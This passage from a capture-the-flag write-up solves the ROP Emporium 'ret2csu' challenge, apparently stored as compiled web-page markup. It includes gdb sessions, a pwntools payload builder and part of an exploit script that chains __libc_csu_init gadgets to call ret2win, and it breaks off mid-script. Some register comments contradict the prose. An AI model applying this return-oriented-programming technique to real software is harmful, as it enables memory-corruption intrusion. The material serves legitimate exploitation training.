program.\"}),(0,e.jsx)(a.p,{children:\"For debugging purposes, we set a breakpoint in our first address of the ropchain gadget, and run our program with the generated payload.\"}),(0,e.jsx)(a.pre,{className:\"language-nasm\",children:(0,e.jsxs)(a.code,{className:\"language-nasm code-highlight\",children:[(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"(gdb) break \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0x000000000040069a\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"Breakpoint \",(0,e.jsx)(a.span,{className:\"token number\",children:\"1\"}),\" at \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x40069a\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"(gdb) r \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"/\"}),\"tmp\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"/\"}),`payload\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"Starting program: \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"/\"}),\"home\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"/\"}),\"vx\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"/\"}),\"Downloads\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"/\"}),\"rop\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"/\"}),\"rop\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"/\"}),\"ret2csu\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"/\"}),\"ret2csu \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"/\"}),\"tmp\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"/\"}),`payload\n`]}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"Breakpoint \",(0,e.jsx)(a.span,{className:\"token number\",children:\"1\"}),\", \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x000000000040069a\"}),` in __libc_csu_init ()\n`]}),(0,e.jsx)(a.span,{className:\"code-line\",children:`(gdb) c\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`Continuing.\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`ret2csu by ROP Emporium\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`x86_64\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"Check out https:\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"/\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"/\"}),\"ropemporium.com\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"/\"}),\"challenge\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"/\"}),`ret2csu.html for information on how to solve this challenge.\n`]}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\" Thank you\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"!\"}),`\n`]}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"Breakpoint \",(0,e.jsx)(a.span,{className:\"token number\",children:\"1\"}),\", \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x000000000040069a\"}),` in __libc_csu_init ()\n`]}),(0,e.jsx)(a.span,{className:\"code-line\",children:`(gdb) \n`})]})}),(0,e.jsxs)(a.p,{children:[\"When the program is run,its hits the breakpoint. We enter \",(0,e.jsx)(a.strong,{children:\"c\"}),\" command for continue, to continue the execution of our program. When the program finishes the execution, the return address now points back to the address of our first gadget, Because of the breakpoint, the execution stops. Now we can inspect the memory addresses in order to understand the behavior of the program and the values loaded in the registers loaded in our first chain.\"]}),(0,e.jsx)(a.pre,{className:\"language-nasm\",children:(0,e.jsxs)(a.code,{className:\"language-nasm code-highlight\",children:[(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"(gdb) x\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"/\"}),\"10i \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"$\"}),`rip\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x40069a\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),\"__libc_csu_init\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"90\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tpop    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbx\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x40069b\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),\"__libc_csu_init\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"91\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tpop    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x40069c\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),\"__libc_csu_init\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"92\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tpop    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r12\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x40069e\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),\"__libc_csu_init\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"94\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tpop    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r13\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x4006a0\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),\"__libc_csu_init\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"96\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tpop    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r14\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x4006a2\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),\"__libc_csu_init\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"98\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tpop    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r15\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x4006a4\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),\"__libc_csu_init\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"100\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),`:\tret    \n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x4006a5\"}),`:\tnop\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x4006a6\"}),\":\tnop    WORD PTR \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"cs\"}),\":\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"[\"}),(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rax\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rax\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"]\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x4006b0\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),\"__libc_csu_fini\",(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),`:\trepz ret \n`]})]})}),(0,e.jsxs)(a.p,{children:[\"Now we can Single step through our assembly code and view the value stored in the register values of our gadget. The command for single stepping in gdb is \",(0,e.jsx)(a.strong,{children:\"si\"}),\".\"]}),(0,e.jsx)(a.pre,{className:\"language-nasm\",children:(0,e.jsxs)(a.code,{className:\"language-nasm code-highlight\",children:[(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"(gdb) i r \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbx\"}),\" \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),\" \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r12\"}),\" \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r13\"}),\" \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r14\"}),\" \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r15\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbx\"}),\"            \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x4343434343434343\"}),\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"4846791580151137091\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),\"            \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x4242424242424242\"}),\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x4242424242424242\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r12\"}),\"            \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x4141414141414141\"}),\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"4702111234474983745\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r13\"}),\"            \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0xdeadbeefdeadbeef\"}),\"  \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"2401053088876216593\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r14\"}),\"            \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0xcafebabecafebabe\"}),\"  \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"3819410105351357762\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r15\"}),\"            \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0xd00df00dd00df00d\"}),\"  \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"3454841397007486963\"}),`\n`]}),(0,e.jsx)(a.span,{className:\"code-line\",children:`(gdb) \n`})]})}),(0,e.jsx)(a.p,{children:\"From the analysis, we are able to control all the register value in our chain using our generated payload file. The code for generating the payload is shown below.\"}),(0,e.jsx)(a.pre,{className:\"language-nasm\",children:(0,e.jsxs)(a.code,{className:\"language-nasm code-highlight\",children:[(0,e.jsx)(a.span,{className:\"code-line\",children:`import pwn\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"pop_gadget \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" pwn.p64(\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0040069a\"}),`)\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\"b\",(0,e.jsx)(a.span,{className:\"token string\",children:'\"A\"'}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"32\"}),` #fill the buffer\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\"b\",(0,e.jsx)(a.span,{className:\"token string\",children:'\"B\"'}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"8\"}),\" #\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),`(saved)\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"=\"}),` pop_gadget  #retaddr\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" pwn.p64(\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x4343434343434343\"}),\")#\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbx\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" pwn.p64(\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x4242424242424242\"}),\")#\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" pwn.p64(\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x4141414141414141\"}),\") #\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r12\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" pwn.p64(\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0xdeadbeefdeadbeef\"}),\") #\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r13\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" pwn.p64(\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0xcafebabecafebabe\"}),\") #\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r14\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" pwn.p64(\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0xd00df00dd00df00d\"}),\") #\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r15\"}),`\n`]}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"open(\",(0,e.jsx)(a.span,{className:\"token string\",children:\"'payload'\"}),\", \",(0,e.jsx)(a.span,{className:\"token string\",children:\"'wb'\"}),`).write(payload)\n`]})]})}),(0,e.jsxs)(a.p,{children:[\"Now, because we are able to control the registers we want, we need to determine the correct or desired values for \",(0,e.jsx)(a.strong,{children:\"rbx, rbp and r12\"}),\" registers because 0x41..., 0x42...., 0x43... are not valid memory addresses. Because after execution of our second rop gadget, we need to set right values of rbp and rbx due to a loop conditional.\"]}),(0,e.jsx)(a.pre,{className:\"language-nasm\",children:(0,e.jsxs)(a.code,{className:\"language-nasm code-highlight\",children:[(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000400680\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"64\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rdx\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r15\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000400683\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"67\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rsi\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r14\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000400686\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"70\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"edi\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r13d\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000400689\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"73\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tcall   QWORD PTR \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"[\"}),(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r12\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbx\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"8\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"]\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x000000000040068d\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"77\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tadd    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbx\"}),\",\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x1\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000400691\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"81\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tcmp    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbx\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000400694\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"84\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tjne    \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x400680\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),\"__libc_csu_init\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"64\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000400696\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"86\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tadd    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rsp\"}),\",\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x8\"}),`\n`]})]})}),(0,e.jsxs)(a.p,{children:[\"The address of second gadget starts at \",(0,e.jsx)(a.strong,{children:\"0x0000000000400680\"}),\",in which we are setting the values of rdi,r14 and rdx with correct argument values. we need to set the values of \",(0,e.jsx)(a.strong,{children:\"rbx\"}),\" and \",(0,e.jsx)(a.strong,{children:\"rbp\"}),\" correctly so that conditional \",(0,e.jsx)(a.strong,{children:\"cmp\"}),\" is always true. Because of add instruction of 1 to rbx, we need to set the rbx value to 0 and rbp value to 1. when the comparison is being done, the values are equal and Zero flag is set. Adjust values in payload script and single step to confirm the validity of new values in the memory.\"]}),(0,e.jsxs)(a.p,{children:[\"For register \",(0,e.jsx)(a.strong,{children:\"r12\"}),\", we set the value to a memory region that is executable. In the binary, the \",(0,e.jsx)(a.strong,{children:\".bss\"}),\" section is executable. we now set the r12 register with the memory address of bss section. After executing our second rop chain gadget, we need to adjust the stack as shown in the exploit code to avoid segmentation fault.\"]}),(0,e.jsxs)(a.p,{children:[\"Lastly we need to control the \",(0,e.jsx)(a.strong,{children:\"rdi\"}),\" register with the value \",(0,e.jsx)(a.strong,{children:\"0xdeadbeefdeadbeef\"}),\". Because we have full control of rdx and rsi register, we need to look for \",(0,e.jsx)(a.strong,{children:\"pop rdi, ret\"}),\" gadget.\"]}),(0,e.jsx)(a.p,{children:\"The pop rdi, ret gadget\"}),(0,e.jsx)(a.pre,{className:\"language-nasm\",children:(0,e.jsxs)(a.code,{className:\"language-nasm code-highlight\",children:[(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x004006a3\"}),\"                 5f  pop \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rdi\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x004006a4\"}),`                 c3  ret\n`]})]})}),(0,e.jsxs)(a.p,{children:[\"Now we can pass the \",(0,e.jsx)(a.strong,{children:\"0xdeadbeefdeadbeef\"}),\" argument to the ret2win function.Now we have all the correct values of rdi, rsi and rdx correctly set, calling the ret2win function will result to us getting the correct flag.\"]}),(0,e.jsxs)(a.h2,{id:\"exploit\",children:[(0,e.jsx)(a.a,{href:\"#exploit\",\"aria-hidden\":\"true\",tabIndex:\"-1\",children:(0,e.jsx)(a.span,{className:\"icon icon-link\"})}),\"Exploit\"]}),(0,e.jsx)(a.p,{children:\"The full code of the rop is as shown below.\"}),(0,e.jsx)(a.pre,{children:(0,e.jsxs)(a.code,{className:\"code-highlight language-python3\",children:[(0,e.jsx)(a.span,{className:\"code-line\",children:`import pwn\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`pwn.context.encoding = \"latin-1\" \n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`pwn.warnings.simplefilter(\"ignore\")\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`pwn.context.arch = \"amd64\"\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`io = pwn.process('./ret2csu')\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`#arguments passed to ret2win function ret2win(arg1, arg2, arg3)\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`arg1 =pwn.p64(0xdeadbeefdeadbeef)\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`arg2 =pwn.p64(0xcafebabecafebabe)\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`arg3 =pwn.p64(0xd00df00dd00df00d)\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`ret2win_addr =pwn.p64(io.elf.plt['ret2win'])   #resolve address of ret2win function\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`pop_rbx_rbp_r12_r13_r14_r15_addr = pwn.p64(0x0040069a)  #first stage gadget\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`dereference_pointer = pwn.p64(0x00600e48)  #bss area which is executable\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`stage2_addr = pwn.p64(0x00400680)  #addr of second stage rop chain\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`pop_rdi = pwn.p64(0x004006a3)\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`#ropchains\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`#stage1 ropchain\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`'''\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`            0x0040069a      pop   rbx\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\\u2502           0x0040069b      pop   rbp\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\\u2502           0x0040069c      pop   r12\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\\u2502           0x0040069e      pop   r13\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\\u2502           0x004006a0      pop   r14\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\\u2502           0x004006a2      pop   r15\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\\u2514           0x004006a4      ret\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`'''\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`#Determine the loop values for conditional branch\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`'''\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\\u254E\\u2502          0x00400689      call  qword [r12 + rbx*8]\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\\u2502      \\u254E\\u2502   0x0040068d      add   rbx, 1\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\\u2502      \\u254E\\u2502   0x00400691      cmp   rbp, rbx\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\\u2502      \\u2514\\u2500\\u2500< 0x00400694      jne   0x400680\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`'''\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`stage1 = pop_rbx_rbp_r12_r13_r14_r15_addr\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`stage1 += pwn.p64(0)   #set RBP=0\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`stage1 += pwn.p64(1)   #set RBX=1\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`stage1 += dereference_pointer #set R12\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`stage1 += arg1   #R13\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`stage1 += arg2   #R14\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`stage1 += arg3   